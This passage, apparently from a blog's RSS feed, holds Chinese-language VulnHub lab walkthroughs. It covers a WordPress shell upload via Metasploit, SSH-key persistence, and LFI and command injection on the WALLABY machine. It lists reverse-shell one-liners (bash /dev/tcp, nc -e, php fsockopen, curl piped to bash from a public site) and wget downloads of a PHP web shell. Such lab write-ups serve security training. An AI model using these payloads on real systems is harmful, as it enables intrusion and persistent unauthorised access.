&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;使用msf自带exploit/unix/webapp/下的模块进行利用&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;msfconsole&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use exploit/unix/webapp/wp_admin_shell_upload&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set password 24992499&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set rhosts 192.168.31.155&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set username c0rrupt3d_brain&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set targeturi /wordpress&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-007.png&#34; alt&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;获取到标准的 shell&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;shell&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 -c &amp;#x27;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stty raw -echo;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-008.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;可以通过 nc 监听，将 shell 从 msf 反弹至一个普通的 terminal&lt;br&gt;
-&amp;gt; 成功得到一个 www-data 网站用户的 shell&lt;/p&gt;
&lt;h3 id=&#34;历史遗留文件提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#历史遗留文件提权&#34;&gt;#&lt;/a&gt; 历史遗留文件提权&lt;/h3&gt;
&lt;p&gt;查看是否有隐藏文件，判断出哪个文件可能是遗留密码&lt;br&gt;
这里很明显.root_password_ssh.txt 是 root 密码&lt;br&gt;
通过 su root 登陆到了 root 账户&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-009.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 成功得到 root 管理员的 shell&lt;/p&gt;
&lt;h3 id=&#34;密钥对权限维持&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#密钥对权限维持&#34;&gt;#&lt;/a&gt; 密钥对权限维持&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;服务端写 ssh 公钥，并将私钥文件发送至攻击机&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ssh-keygen -t rsa&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat ~/.ssh/id_rsa.pub &amp;gt;&amp;gt; ~/.ssh/authorized_keys&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;scp ~/.ssh/id_rsa parallels@192.168.31.135:~/.ssh/vulnhub_evm&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rm -f ~/.ssh/id_rsa*&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-010.png&#34; alt&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;攻击机保存私钥修改权限，并尝试连接靶机&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;chmod 700 vulnhub_evm&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh root@192.168.31.155 -i ~/.ssh/vulnhub_evm&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-011.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
-&gt; 渗透结束
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/109%20WALLABY/</guid>
            <title>VULNHUB 9 WALLABY</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/109%20WALLABY/</link>
            <category>VULNHUB 1-10</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvd2FsbGFieXMtbmlnaHRtYXJlLXYxMDIsMTc2Lw==&#34;&gt;https://www.vulnhub.com/entry/wallabys-nightmare-v102,176/&lt;/span&gt;&lt;br&gt;
 教程链接地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1L2FydGljbGUvZGV0YWlscy8xMDQwOTUwMjk=&#34;&gt;https://blog.csdn.net/qq_34801745/article/details/104095029&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 WALLABY：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;通过 netdiscover 扫描当前网卡里边有哪些机器&lt;br&gt;
 &lt;code&gt;sudo netdiscover -i eth0 -r 192.168.31.0/24&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;将所有已知的 ip 暂时存档，对这类 ip 地址不做端口扫描&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; myip.txt &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192.168.31.1 192.168.31.25 192.168.31.58 192.168.31.86 192.168.31.33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192.168.31.120 192.168.31.135 192.168.31.145 192.168.31.162 192.168.31.44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;去除一些已知 ip 的机器，对剩余 IP 进行端口扫描，判断目标 IP&lt;br&gt;
 &lt;code&gt;sudo nmap -PA 192.168.31.107 --excludefile myip.txt&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-150.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 目标机器的 ip 地址： 192.168.31.5&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;确认靶机 ip 开放的端口信息&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;code&gt;sudo nmap -A -p- 192.168.31.15 -oN /tmp/wallaby.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-151.png&#34; width=&#34;460&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 22, 80, 6667&lt;/p&gt;
&lt;h3 id=&#34;lfi-漏洞测试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#lfi-漏洞测试&#34;&gt;#&lt;/a&gt; LFI 漏洞测试&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS8=&#34;&gt;http://192.168.31.5/&lt;/span&gt; 进行信息收集&lt;/li&gt;
&lt;/ol&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-152.png&#34; width=&#34;390&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;输入名字并登陆此网站&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-153.png&#34; width=&#34;390&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;观察 url 地址，发现存在 lfi 本地文件包含漏洞&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-154.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;直接构造 http://192.168.31.5/?page=/etc/passwd&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-155.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;访问 http://192.168.31.5/?page=/etc/sudoers 发现对方管理员检测到了 lfi 攻击&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-156.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;重新访问 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS8=&#34;&gt;http://192.168.31.5/&lt;/span&gt; 发现网站已经挂掉了&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-157.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 80 端口被关闭，网站已被注销，重新尝试端口扫描&lt;/p&gt;
&lt;h3 id=&#34;60080-网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#60080-网站信息收集&#34;&gt;#&lt;/a&gt; 60080 网站信息收集&lt;/h3&gt;
&lt;p&gt;重新扫描端口，发现 80 被关闭，新开了一个 60080 端口网站&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC8=&#34;&gt; http://192.168.31.5:60080/&lt;/span&gt; 渗透测试&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-158.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;发现此端口确实存在网站，目标转为对此网站的分析&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-159.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;目录爆破，收集更多的目录信息&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;dirsearch -u http://192.168.31.5:60080/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gobuster dir -u http://192.168.31.5:60080/ - w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-160.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;并没有发现任何有价值的信息&lt;/p&gt;
&lt;h3 id=&#34;dirb-目录扫描&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#dirb-目录扫描&#34;&gt;#&lt;/a&gt; dirb 目录扫描&lt;/h3&gt;
&lt;p&gt;仔细回想之前的操作，在 80 端口对网站渗透时，发现了 lfi 漏洞&lt;br&gt;
是在 http://192.168.31.5/?page=home 上的，尝试访问 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC8/cGFnZT1ob21l&#34;&gt;http://192.168.31.5:60080/?page=home&lt;/span&gt; 仍存在 lfi 漏洞&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-161.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC8/cGFnZT0vZXRjL3N1ZG9lcnM=&#34;&gt;http://192.168.31.5:60080/?page=/etc/sudoers&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-162.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;使用 dirb 对 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC8/cGFnZT0=&#34;&gt;http://192.168.31.5:60080/?page=&lt;/span&gt; 目录进行扫描&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;dirb是一个基于字典的web目录扫描工具，查找现有的（和/或隐藏的）Web对象，通过对Web服务器发起基于字典的攻击并分析响应的数据。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dirb http://192.168.31.5:60080/index.php?page=&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-163.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 敏感网址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC9pbmRleC5waHA/cGFnZT1tYWlsZXI=&#34;&gt;http://192.168.31.5:60080/index.php?page=mailer&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;将这些文件访问了一遍之后，发现此网站是唯一可能存在漏洞的目标&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-164.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;检查源代码，发现这里有一个 rce 漏洞&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-165.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC9pbmRleC5waHA/cGFnZT1tYWlsZXImYW1wO21haWw9bWFpbA==&#34;&gt;http://192.168.31.5:60080/index.php?page=mailer&amp;amp;mail=mail&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC9pbmRleC5waHA/cGFnZT1tYWlsZXImYW1wO21haWw9bHM=&#34;&gt;http://192.168.31.5:60080/index.php?page=mailer&amp;amp;mail=ls&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-166.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;phpcurlbashnc-反弹&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#phpcurlbashnc-反弹&#34;&gt;#&lt;/a&gt; php/curl/bash/nc 反弹&lt;/h3&gt;
&lt;p&gt;判断目标服务器上是否存在相关的命令&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC9pbmRleC5waHA/cGFnZT1tYWlsZXImYW1wO21haWw9d2hpY2glMjBjdXJs&#34;&gt; http://192.168.31.5:60080/index.php?page=mailer&amp;amp;mail=which%20curl&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC9pbmRleC5waHA/cGFnZT1tYWlsZXImYW1wO21haWw9d2hpY2glMjBweXRob24=&#34;&gt;http://192.168.31.5:60080/index.php?page=mailer&amp;amp;mail=which%20python&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC9pbmRleC5waHA/cGFnZT1tYWlsZXImYW1wO21haWw9d2hpY2glMjBwaHA=&#34;&gt;http://192.168.31.5:60080/index.php?page=mailer&amp;amp;mail=which%20php&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC9pbmRleC5waHA/cGFnZT1tYWlsZXImYW1wO21haWw9d2hpY2glMjBuYw==&#34;&gt;http://192.168.31.5:60080/index.php?page=mailer&amp;amp;mail=which%20nc&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;也可以直接一句话判断所有的信息：&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC9pbmRleC5waHA/cGFnZT1tYWlsZXImYW1wO21haWw9d2hpY2glMjBjdXJsO3doaWNoJTIwcGhwO3doaWNoJTIwcHl0aG9uO3doaWNoJTIwYmFzaDs=&#34;&gt;http://192.168.31.5:60080/index.php?page=mailer&amp;amp;mail=which curl;which php;which python;which bash;&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-167.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;根据收集到的服务器上的信息进行反弹shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;php -r &amp;#x27;$sock=fsockopen(&amp;quot;192.168.31.135&amp;quot;,4444);exec(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;quot;);&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;curl http://www.chentuo.asia/shell.sh | bash (success)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bash -c &amp;#x27;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.135/4444 0&amp;gt;&amp;amp;1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.135/4445 0&amp;gt;&amp;amp;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc 192.168.31.135 4444 -e /bin/bash&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-168.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;kali-php木马反弹&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#kali-php木马反弹&#34;&gt;#&lt;/a&gt; kali php 木马反弹&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cp /usr/share/webshells/php/php-reverse-shell.php shell.php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vim shell.php 将默认端口改为kali的ip和端口号&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python 3 -m http.server 80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;构造如下url执行php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.31.5:60080/index.php?page=mailer&amp;amp;mail=wget%20http://192.168.31.135/shell.php;%20chmod%20777%20shell.php;%20ls%20-al&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-169.png&#34; alt&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;也可以将shell.php发送到有公网ip的网站上让目标机器去访问远程url地址上的payload并反弹shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;scp -P 2121 shell.php root@1.117.52.219:/data/wwwroot/www.chentuo.asia/shell.php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;构造如下url执行php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.31.5:60080/index.php?page=mailer&amp;amp;mail=wget%20http://www.chentuo.asia/shell.php;%20chmod%20777%20shell.php;%20ls%20-al&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;上述的方法下载下来的 shell.php 是空文件，默认不允许下载此类文件&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;在服务器上操作 &lt;span class=&#34;built_in&#34;&gt;cp&lt;/span&gt; shell.php shell.txt,下载后重命名即可,构造如下url执行php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.31.5:60080/index.php?page=mailer&amp;amp;mail=wget%20http://www.chentuo.asia/shell.txt;mv%20shell.txt%20shell.php%20chmod%20777%20shell.php;%20ls%20-al&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# 